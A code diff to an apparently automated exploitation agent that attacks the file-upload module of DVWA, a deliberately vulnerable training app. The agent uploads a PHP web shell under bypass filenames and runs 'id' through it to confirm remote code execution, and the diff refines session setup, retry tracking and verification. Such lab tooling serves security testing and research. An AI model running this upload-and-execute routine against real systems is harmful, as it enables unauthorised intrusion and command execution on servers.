@@ -7,8 +7,16 @@ import re
 from typing import Any
 
 from agents.base_agent import BaseAgent
-from agents.state_utils import make_update, module_endpoint, normalize_security_level
+from agents.state_utils import (
+    already_tried_payloads,
+    append_error_marker,
+    make_update,
+    module_endpoint,
+    normalize_security_level,
+    prepare_agent_session,
+)
 from core.state import ExploitationState
+from foundation.http_client import RequestTimeoutError, TransportError
 from foundation.payload_library import PayloadLibrary
 from foundation.session_manager import DVWASession
 from foundation.verifier import Verifier
@@ -57,6 +65,7 @@ class UploadAgent(BaseAgent):
         endpoint = module_endpoint(state, self.module_name, "/vulnerabilities/upload/")
         payload_set = self.payloads.get(self.module_name, level)
         bypass_names = list(payload_set.bypass.get(level, []))
+        already_tried = already_tried_payloads(state, self.module_name)
 
         candidate_names = ["shell.php"]
         for candidate in bypass_names:
@@ -65,7 +74,19 @@ class UploadAgent(BaseAgent):
 
         session = DVWASession(target_url)
         try:
+            ready, prep_notes = prepare_agent_session(session, level, require_login=True)
+            tried_now.extend(prep_notes)
+            if not ready:
+                return make_update(
+                    state=state,
+                    module_name=self.module_name,
+                    score=score,
+                    tried_payloads=tried_now,
+                )
+
             for filename in candidate_names:
+                if filename in already_tried:
+                    continue
                 tried_now.append(filename)
                 files = {
                     "uploaded": (
@@ -98,13 +119,13 @@ class UploadAgent(BaseAgent):
 
                     verify = session.get(uploaded_path, params={"cmd": "id"})
                     verify_body = verify.text or ""
-                    if self.verifier.contains_any(verify_body, ["uid=", "www-data", "root"]).ok:
+                    if self.verifier.regex_match(verify_body, [r"uid=\d+", r"gid=\d+"]).ok:
                         score = 4
                         confirmed = [*confirmed, "rce_achieved"]
                         outcomes = ["rce_achieved"]
                     break
-        except Exception:
-            pass
+        except (TransportError, RequestTimeoutError, RuntimeError, ValueError) as exc:
+            append_error_marker(tried_now, "upload_runtime_error", exc)
         finally:
             session.close()
 
